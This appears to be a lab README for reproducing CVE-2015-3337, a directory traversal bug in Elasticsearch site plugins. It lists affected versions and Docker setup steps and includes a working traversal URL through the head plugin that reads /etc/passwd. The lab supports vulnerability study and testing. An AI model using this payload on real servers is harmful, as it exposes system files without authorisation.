# ElasticSearch Directory Traversal Vulnerability (CVE-2015-3337) Test Environment

Jre version: openjdk: 8-jre

Elasticsearch version: v1.4.4

Impact version: 1.4.5 or less / 1.5.2 or less

## Principle

After installing the plugin with the "site" function, the plugin directory can be jumped up using `../`, causing the directory to traverse the vulnerability and can read any file. Elasticsearch without any plugins installed is not affected.

## test environment

Compile and run the test environment

```
Docker-compose build
Docker-compose up -d
```

The test environment has a plugin installed by default: `elasticsearch-head`, the home page is here: https://github.com/mobz/elasticsearch-head

Go to `http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd` to read any File (do not access it in the browser):

![](1.png)

## head插件

The head plugin provides the front page of elasticsearch. You can see it by visiting `http://your-ip:9200/_plugin/head/`, not much to say.